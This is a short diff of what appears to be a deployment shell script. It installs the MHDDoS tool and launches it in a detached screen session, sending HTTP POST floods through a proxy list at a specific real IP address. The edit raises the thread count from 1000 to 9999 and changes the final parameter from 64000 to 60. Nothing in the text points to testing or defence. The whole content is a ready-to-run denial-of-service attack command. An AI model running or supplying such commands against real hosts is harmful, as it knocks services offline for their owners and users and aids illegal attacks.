@@ -16,4 +16,4 @@ cd /root/MHDDoS/
 
 pip3 install -r requirements.txt
 
-screen -dm python3 start.py post http://88.198.48.45 5 1000 proxy.txt 100 64000
+screen -dm python3 start.py post http://88.198.48.45 5 9999 proxy.txt 100 60
